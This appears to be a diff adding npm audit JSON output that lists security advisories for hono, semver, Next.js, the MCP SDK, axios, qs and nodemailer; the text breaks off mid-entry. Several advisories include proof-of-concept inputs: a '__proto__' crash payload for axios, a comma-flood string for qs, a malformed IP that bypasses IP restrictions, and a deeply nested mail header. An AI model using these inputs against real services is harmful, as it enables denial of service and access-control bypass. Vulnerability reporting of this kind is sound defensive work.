+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-6wqw-2p9w-4vw4\n- https://github.com/honojs/hono/commit/12c511745b3f1e7a3f863a23ce5f921c7fa805d1\n- https://github.com/honojs/hono/releases/tag/v4.11.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24472\n- https://github.com/advisories/GHSA-6wqw-2p9w-4vw4",
+      "created": "2026-01-27T19:04:17.000Z",
+      "id": 1112677,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nCache Middleware contains an information disclosure vulnerability caused by improper handling of HTTP cache control directives. The middleware does not respect standard cache control headers such as `Cache-Control: private` or `Cache-Control: no-store`, which may result in private or authenticated responses being cached and subsequently exposed to unauthorized users.\n\n## Details\n\nThe vulnerability exists in the cache decision logic of Cache Middleware. When determining whether a response should be cached, the middleware does not take HTTP cache control semantics into account and may cache responses that are explicitly marked as private by the application. While some runtimes, such as Cloudflare Workers, enforce cache control restrictions at the platform level, other runtimes including Deno, Bun, and Node.js rely on the middleware’s behavior. As a result, applications running on these runtimes may unintentionally cache sensitive responses.\n\n## Impact\n\nThis issue can lead to Web Cache Deception and information disclosure. If an authenticated user accesses an endpoint that returns user-specific or sensitive data and the response is cached despite being marked as private, subsequent unauthenticated requests may receive the cached response. This may result in the exposure of personally identifiable information or session-related data. The impact is limited to applications that use the hono/cache middleware and rely on it to correctly honor HTTP cache control directives.\n\n## Affected Components\n\n* Cache Middleware",
+      "reported_by": null,
+      "title": "Hono cache middleware ignores \"Cache-Control: private\" leading to Web Cache Deception",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24472"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.11.7",
+      "github_advisory_id": "GHSA-6wqw-2p9w-4vw4",
+      "recommendation": "Upgrade to version 4.11.7 or later",
+      "patched_versions": ">=4.11.7",
+      "updated": "2026-01-29T03:39:38.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-524",
+        "CWE-613"
+      ],
+      "url": "https://github.com/advisories/GHSA-6wqw-2p9w-4vw4"
+    },
+    "1112678": {
+      "findings": [
+        {
+          "version": "4.11.3",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-r354-f388-2fhh\n- https://github.com/honojs/hono/commit/edbf6eea8e6c26a3937518d4ed91d8666edeec37\n- https://github.com/honojs/hono/releases/tag/v4.11.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24398\n- https://github.com/advisories/GHSA-r354-f388-2fhh",
+      "created": "2026-01-27T19:01:43.000Z",
+      "id": 1112678,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nIP Restriction Middleware in Hono is vulnerable to an IP address validation bypass. The `IPV4_REGEX` pattern and `convertIPv4ToBinary` function in `src/utils/ipaddr.ts` do not properly validate that IPv4 octet values are within the valid range of 0-255, allowing attackers to craft malformed IP addresses that bypass IP-based access controls.\n\n## Details\n\nThe vulnerability exists in two components:\n\n1. **Permissive regex pattern:** The `IPV4_REGEX (/^[0-9]{0,3}\\.[0-9]{0,3}\\.[0-9]{0,3}\\.[0-9]{0,3}$/)` accepts octet values greater than 255 (e.g., `999`).\n2. **Unsafe binary conversion:** The `convertIPv4ToBinary` function does not validate octet ranges before performing bitwise operations. When an octet exceeds 255, it overflows into adjacent octets during the bit-shift calculation.\n\nFor example, the IP address `1.2.2.355` is accepted and converts to the same binary value as 1.2.3.99:\n\n* `355` = `256 + 99` = `0x163`\n* After bit-shifting: `(1 << 24) + (2 << 16) + (2 << 8) + 355` = `0x01020363` = `1.2.3.99`\n\n## Impact\n\nAn attacker can bypass IP-based restrictions by crafting malformed IP addresses:\n\n* **Blocklist bypass:** If `1.2.3.0/24` is blocked, an attacker can use `1.2.2.355` (or similar) to bypass the restriction.\n* **Allowlist bypass:** Requests from unauthorized IP ranges may be incorrectly permitted.\n\nThis is exploitable when the application relies on client-provided IP addresses (e.g., `X-Forwarded-For header`) for access control decisions.\n\n## Affected Components\n\n* IP Restriction Middleware\n* `src/utils/ipaddr.ts`: `IPV4_REGEX`, `convertIPv4ToBinary`, `distinctRemoteAddr`",
+      "reported_by": null,
+      "title": "Hono IPv4 address validation bypass in IP Restriction Middleware allows IP spoofing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24398"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.11.7",
+      "github_advisory_id": "GHSA-r354-f388-2fhh",
+      "recommendation": "Upgrade to version 4.11.7 or later",
+      "patched_versions": ">=4.11.7",
+      "updated": "2026-01-29T03:39:03.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-185"
+      ],
+      "url": "https://github.com/advisories/GHSA-r354-f388-2fhh"
+    },
+    "1112911": {
+      "findings": [
+        {
+          "version": "4.11.3",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-w332-q679-j88p\n- https://github.com/honojs/hono/commit/cf9a78db4d0a19b117aee399cbe9d3a6d9bfd817\n- https://github.com/honojs/hono/releases/tag/v4.11.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24473\n- https://github.com/advisories/GHSA-w332-q679-j88p",
+      "created": "2026-01-27T19:09:01.000Z",
+      "id": 1112911,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nServe static Middleware for the Cloudflare Workers adapter contains an information disclosure vulnerability that may allow attackers to read arbitrary keys from the Workers environment. Improper validation of user-controlled paths can result in unintended access to internal asset keys.\n\n## Details\n\nThe vulnerability exists in the serve-static middleware used with the Cloudflare Workers adapter. When serving static assets, the middleware does not sufficiently validate or restrict user-supplied paths before resolving them against the Workers asset storage.\n\nAs a result, an attacker may craft requests that access arbitrary keys beyond the intended static asset scope. This issue only affects applications running on Cloudflare Workers that use Serve static Middleware with user-controllable request paths.\n\n## Impact\n\nThis vulnerability may lead to information disclosure by allowing unauthorized access to internal assets or data stored in the Workers environment. The exposed data is limited to readable asset keys and does not allow modification of stored data or execution of arbitrary code.\n\nThe impact is limited to applications that use Serve static Middleware in the Cloudflare Workers adapter and rely on it to safely handle untrusted request paths.\n\n## Affected Components\n\n* Serve static Middleware (Cloudflare Workers adapter)",
+      "reported_by": null,
+      "title": "Hono has an Arbitrary Key Read in Serve static Middleware (Cloudflare Workers Adapter)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24473"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.11.7",
+      "github_advisory_id": "GHSA-w332-q679-j88p",
+      "recommendation": "Upgrade to version 4.11.7 or later",
+      "patched_versions": ">=4.11.7",
+      "updated": "2026-02-04T19:53:49.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-200",
+        "CWE-284",
+        "CWE-668"
+      ],
+      "url": "https://github.com/advisories/GHSA-w332-q679-j88p"
+    },
+    "1112921": {
+      "findings": [
+        {
+          "version": "7.3.2",
+          "paths": [
+            "web__mobile>expo>@expo/cli>@expo/image-utils>semver"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2022-25883\n- https://github.com/npm/node-semver/pull/564\n- https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441\n- https://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795\n- https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104\n- https://github.com/npm/node-semver/blob/main/internal/re.js#L138\n- https://github.com/npm/node-semver/blob/main/internal/re.js#L160\n- https://github.com/npm/node-semver/pull/585\n- https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c\n- https://github.com/npm/node-semver/pull/593\n- https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0\n- https://github.com/npm/node-semver/blob/main/classes/range.js%23L97-L104\n- https://github.com/npm/node-semver/blob/main/internal/re.js%23L138\n- https://github.com/npm/node-semver/blob/main/internal/re.js%23L160\n- https://security.netapp.com/advisory/ntap-20241025-0004\n- https://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
+      "created": "2023-06-21T06:30:28.000Z",
+      "id": 1112921,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
+      "reported_by": null,
+      "title": "semver vulnerable to Regular Expression Denial of Service",
+      "metadata": null,
+      "cves": [
+        "CVE-2022-25883"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "semver",
+      "vulnerable_versions": ">=7.0.0 <7.5.2",
+      "github_advisory_id": "GHSA-c2qf-rxjj-qqgw",
+      "recommendation": "Upgrade to version 7.5.2 or later",
+      "patched_versions": ">=7.5.2",
+      "updated": "2026-02-04T20:39:10.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2qf-rxjj-qqgw"
+    },
+    "1112990": {
+      "findings": [
+        {
+          "version": "16.0.10",
+          "paths": [
+            "templates__saas-landing>next"
+          ]
+        },
+        {
+          "version": "16.0.10",
+          "paths": [
+            "web__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-5f7q-jpqc-wp7h\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59472\n- https://vercel.com/changelog/summaries-of-cve-2025-59471-and-cve-2025-59472\n- https://github.com/advisories/GHSA-5f7q-jpqc-wp7h",
+      "created": "2026-01-28T15:20:55.000Z",
+      "id": 1112990,
+      "npm_advisory_id": null,
+      "overview": "A denial of service vulnerability exists in Next.js versions with Partial Prerendering (PPR) enabled when running in minimal mode. The PPR resume endpoint accepts unauthenticated POST requests with the `Next-Resume: 1` header and processes attacker-controlled postponed state data. Two closely related vulnerabilities allow an attacker to crash the server process through memory exhaustion:\n\n1. **Unbounded request body buffering**: The server buffers the entire POST request body into memory using `Buffer.concat()` without enforcing any size limit, allowing arbitrarily large payloads to exhaust available memory.\n\n2. **Unbounded decompression (zipbomb)**: The resume data cache is decompressed using `inflateSync()` without limiting the decompressed output size. A small compressed payload can expand to hundreds of megabytes or gigabytes, causing memory exhaustion.\n\nBoth attack vectors result in a fatal V8 out-of-memory error (`FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory`) causing the Node.js process to terminate. The zipbomb variant is particularly dangerous as it can bypass reverse proxy request size limits while still causing large memory allocation on the server.\n\nTo be affected, an application must run with `experimental.ppr: true` or `cacheComponents: true` configured along with the NEXT_PRIVATE_MINIMAL_MODE=1 environment variable.\n\nStrongly consider upgrading to 15.6.0-canary.61 or 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+      "reported_by": null,
+      "title": "Next.js has Unbounded Memory Consumption via PPR Resume Endpoint ",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59472"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.0.0-beta.0 <16.1.5",
+      "github_advisory_id": "GHSA-5f7q-jpqc-wp7h",
+      "recommendation": "Upgrade to version 16.1.5 or later",
+      "patched_versions": ">=16.1.5",
+      "updated": "2026-02-05T17:17:18.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-409",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-5f7q-jpqc-wp7h"
+    },
+    "1113080": {
+      "findings": [
+        {
+          "version": "1.25.1",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-345p-7cg4-v4c7\n- https://github.com/modelcontextprotocol/typescript-sdk/issues/204\n- https://github.com/modelcontextprotocol/typescript-sdk/issues/243\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25536\n- https://github.com/advisories/GHSA-345p-7cg4-v4c7",
+      "created": "2026-02-04T20:04:16.000Z",
+      "id": 1113080,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nCross-client data leak via two distinct issues: (1) reusing a single `StreamableHTTPServerTransport` across multiple client requests, and (2) reusing a single `McpServer`/`Server` instance across multiple transports. Both are most common in stateless deployments.\n\n### Impact\n\nThis advisory covers two related but distinct vulnerabilities. A deployment may be affected by one or both.\n\n#### Issue 1: Transport re-use\n\n**What happens:** When a single `StreamableHTTPServerTransport` instance handles multiple client requests, JSON-RPC message ID collisions cause responses to be routed to the wrong client's HTTP connection. The transport maintains an internal `requestId → stream` mapping, and since MCP client SDKs generate message IDs using an incrementing counter starting at 0, two clients produce identical IDs. The second client's request overwrites the first client's mapping entry, routing the response to the wrong HTTP stream.\n\n**What is affected:** All request types — `tools/call`, `resources/read`, `prompts/get`, etc. No server-initiated features are required to trigger this.\n\n**Conditions:**\n- A single `StreamableHTTPServerTransport` instance is reused across multiple client requests (most common in stateless mode without `sessionIdGenerator`)\n- Two or more clients send requests concurrently\n- Clients generate overlapping JSON-RPC message IDs (the SDK's default client uses an incrementing counter starting at 0)\n\n#### Issue 2: Server/Protocol re-use\n\n**What happens:** When a single `McpServer` (or `Server`) instance is `connect()`ed to multiple transports (one per client), the Protocol's internal `this._transport` reference is silently overwritten. The final response to a request is routed correctly (the Protocol captures the transport reference at request time), but any **server-to-client messages sent during request handling** use the shared `this._transport` reference, which may point to a different client's transport.\n\n**What is affected:** This depends on what features your server uses:\n\n  - **Final responses** (the return value from a tool/resource/prompt handler): Affected in most cases. The Protocol captures this._transport at [request-handling time](https://github.com/modelcontextprotocol/typescript-sdk/blob/main/packages/core/src/shared/protocol.ts#L760), not the transport that delivered the request. This means:\n    - If a request is already in-flight when a second connect() occurs (i.e., the request\n   arrived before the transport was overwritten), the captured reference is correct and\n  the response routes properly.\n    - If a request arrives on the old transport after a second connect() has overwritten\n  this._transport, the captured reference points to the new transport, and the response\n  is mis-routed. The requesting client will time out.\n- **Progress notifications** sent during tool execution via `sendNotification`: **Affected.** These are dispatched through `this._transport`. When the transport has been overwritten and message IDs collide on the new transport, notifications are routed to the wrong client's HTTP stream.\n- **Sampling** (`createMessage`) and **elicitation** requests sent during tool execution via `sendRequest`: **Affected.** Same mechanism — the request is sent to the wrong client.\n- **Spontaneous server-initiated notifications** (outside any request handler): **Affected.** These are sent to whichever client's transport was most recently connected.\n\n**Conditions:**\n- A single `McpServer`/`Server` instance is `connect()`ed to multiple transports across requests or sessions\n- Two or more clients connect concurrently\n- For in-request notifications/requests: message ID collision on the other transport is required for silent data leaking (the SDK's default client uses an incrementing counter starting at 0). Without collision, the transport will throw an error rather than misroute.\n- For spontaneous notifications: no collision needed, messages are always sent to the last-connected client's transport\n\n#### How to tell if you're affected\n\n- **You use `sessionIdGenerator` (stateful mode) with a new `McpServer` per session** → not affected by either issue. Each session has its own transport and server instance.\n- **You use `sessionIdGenerator` but share a single `McpServer` across sessions** → not affected by Issue 1 (transport re-use), but affected by Issue 2 (server re-use) if your tools send progress notifications, sampling, or elicitation during execution.\n- **You are in stateless mode and reuse both a transport and a server across requests** → affected by both issues; all request types can leak.\n- **You are in stateless mode and create a new transport per request, but reuse the server** → affected by Issue 2 only; safe if your tools only return results without sending progress notifications, sampling, or elicitation during execution.\n- **You create a new server + transport per request** → not affected.\n- **Single-client environments** (e.g., local development with one IDE) → not affected.\n\n### Patches\n\nThe fix (v1.26.0) adds runtime guards that turn silent data misrouting into immediate, actionable errors:\n\n1. `Protocol.connect()` now throws if the protocol is already connected to a transport, preventing silent transport overwriting (addresses Issue 2)\n2. Stateless `StreamableHTTPServerTransport.handleRequest()` now throws if called more than once, enforcing one-request-per-transport in stateless mode (addresses Issue 1)\n3. In-flight request handler abort controllers are cleaned up on `close()`, and `sendNotification`/`sendRequest` in handler extras check the abort signal before sending, preventing messages from leaking after a transport is replaced\n\nServers that were incorrectly reusing instances will now receive a clear error message directing them to create separate instances per connection.\n\n### Workarounds\n\nIf you cannot upgrade immediately, ensure your server creates fresh `McpServer` and transport instances for each request (stateless) or session (stateful):\n\n```typescript\n// Stateless mode: create new server + transport per request\napp.post('/mcp', async (req, res) => {\n  const server = new McpServer({ name: 'my-server', version: '1.0.0' });\n  // ... register tools, resources, etc.\n  const transport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });\n  await server.connect(transport);\n  await transport.handleRequest(req, res);\n});\n\n// Stateful mode: create new server + transport per session\nconst sessions = new Map();\napp.post('/mcp', async (req, res) => {\n  const sessionId = req.headers['mcp-session-id'];\n  if (sessions.has(sessionId)) {\n    await sessions.get(sessionId).transport.handleRequest(req, res);\n  } else {\n    const server = new McpServer({ name: 'my-server', version: '1.0.0' });\n    // ... register tools, resources, etc.\n    const transport = new StreamableHTTPServerTransport({\n      sessionIdGenerator: () => randomUUID()\n    });\n    await server.connect(transport);\n    sessions.set(transport.sessionId, { server, transport });\n    await transport.handleRequest(req, res);\n  }\n});\n```",
+      "reported_by": null,
+      "title": "@modelcontextprotocol/sdk has cross-client data leak via shared server/transport instance reuse",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25536"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@modelcontextprotocol/sdk",
+      "vulnerable_versions": ">=1.10.0 <=1.25.3",
+      "github_advisory_id": "GHSA-345p-7cg4-v4c7",
+      "recommendation": "Upgrade to version 1.26.0 or later",
+      "patched_versions": ">=1.26.0",
+      "updated": "2026-02-09T14:52:41.000Z",
+      "cvss": {
+        "score": 7.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-345p-7cg4-v4c7"
+    },
+    "1113092": {
+      "findings": [
+        {
+          "version": "1.13.2",
+          "paths": [
+            "web__odoo-frontend-shell>axios"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433\n- https://github.com/axios/axios/pull/7369\n- https://github.com/axios/axios/commit/28c721588c7a77e7503d0a434e016f852c597b57\n- https://github.com/axios/axios/releases/tag/v1.13.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25639\n- https://github.com/advisories/GHSA-43fc-jf86-j433",
+      "created": "2026-02-09T17:46:14.000Z",
+      "id": 1113092,
+      "npm_advisory_id": null,
+      "overview": "# Denial of Service via **proto** Key in mergeConfig\n\n### Summary\n\nThe `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `'__proto__'`:\n\n1. `JSON.parse('{\"__proto__\": {...}}')` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `'__proto__'` in the iteration\n3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \"axios\";\n\nconst maliciousConfig = JSON.parse('{\"__proto__\": {\"x\": 1}}');\nawait axios.get(\"https://httpbin.org/get\", maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1. Clone axios repository or `npm install axios`\n2. Create file `poc.mjs` with the code above\n3. Run: `node poc.mjs`\n4. Observe the TypeError crash\n\n**Verified output (axios 1.13.4):**\n\n```\nTypeError: merge is not a function\n    at computeConfigValue (lib/core/mergeConfig.js:100:25)\n    at Object.forEach (lib/utils.js:280:10)\n    at mergeConfig (lib/core/mergeConfig.js:98:9)\n```\n\n**Control tests performed:**\n| Test | Config | Result |\n|------|--------|--------|\n| Normal config | `{\"timeout\": 5000}` | SUCCESS |\n| Malicious config | `JSON.parse('{\"__proto__\": {\"x\": 1}}')` | **CRASH** |\n| Nested object | `{\"headers\": {\"X-Test\": \"value\"}}` | SUCCESS |\n\n**Attack scenario:**\nAn application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{\"__proto__\": {\"x\": 1}}`.\n\n### Impact\n\n**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.\n\nAffected environments:\n\n- Node.js servers using axios for HTTP requests\n- Any backend that passes parsed JSON to axios configuration\n\nThis is NOT prototype pollution - the application crashes before any assignment occurs.",
+      "reported_by": null,
+      "title": "Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25639"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "axios",
+      "vulnerable_versions": "<=1.13.4",
+      "github_advisory_id": "GHSA-43fc-jf86-j433",
+      "recommendation": "Upgrade to version 1.13.5 or later",
+      "patched_versions": ">=1.13.5",
+      "updated": "2026-02-09T22:39:36.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-754"
+      ],
+      "url": "https://github.com/advisories/GHSA-43fc-jf86-j433"
+    },
+    "1113161": {
+      "findings": [
+        {
+          "version": "6.14.1",
+          "paths": [
+            ".>googleapis>googleapis-common>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883\n- https://nvd.nist.gov/vuln/detail/CVE-2026-2391\n- https://github.com/ljharb/qs/commit/f6a7abff1f13d644db9b05fe4f2c98ada6bf8482\n- https://github.com/advisories/GHSA-w7fw-mjwx-w883",
+      "created": "2026-02-12T17:04:39.000Z",
+      "id": 1113161,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nThe `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.\n\n**Vulnerable code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThe `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).\n\n### PoC\n**Test 1 - Basic bypass:**\n```\nnpm install qs\n```\n\n```js\nconst qs = require('qs');\n\nconst payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)\nconst options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };\n\ntry {\n  const result = qs.parse(payload, options);\n  console.log(result.a.length);  // Outputs: 26 (bypass successful)\n} catch (e) {\n  console.log('Limit enforced:', e.message);  // Not thrown\n}\n```\n**Configuration:**\n- `comma: true`\n- `arrayLimit: 5`\n- `throwOnLimitExceeded: true`\n\nExpected: Throws \"Array limit exceeded\" error.\nActual: Parses successfully, creating an array of length 26.\n\n\n### Impact\nDenial of Service (DoS) via memory exhaustion.\n\n### Suggested Fix\nMove the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length. Use `currentArrayLength` (already calculated upstream) for consistency with bracket notation fixes.\n\n**Current code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\n\n**Fixed code:**\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    const splitArray = val.split(',');\n    if (splitArray.length > options.arrayLimit - currentArrayLength) {  // Check against remaining limit\n        if (options.throwOnLimitExceeded) {\n            throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n        } else {\n            // Optionally convert to object or truncate, per README\n            return splitArray.slice(0, options.arrayLimit - currentArrayLength);\n        }\n    }\n    return splitArray;\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThis aligns behavior with indexed and bracket notations, reuses `currentArrayLength`, and respects `throwOnLimitExceeded`. Update README to note the consistent enforcement.",
+      "reported_by": null,
+      "title": "qs's arrayLimit bypass in comma parsing allows denial of service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2391"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.7.0 <=6.14.1",
+      "github_advisory_id": "GHSA-w7fw-mjwx-w883",
+      "recommendation": "Upgrade to version 6.14.2 or later",
+      "patched_versions": ">=6.14.2",
+      "updated": "2026-02-12T20:08:00.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-w7fw-mjwx-w883"
+    },
+    "1113165": {
+      "findings": [
+        {
+          "version": "6.10.1",
+          "paths": [
+            "templates__saas-landing>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+      "created": "2025-12-01T20:44:25.000Z",
+      "id": 1113165,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an 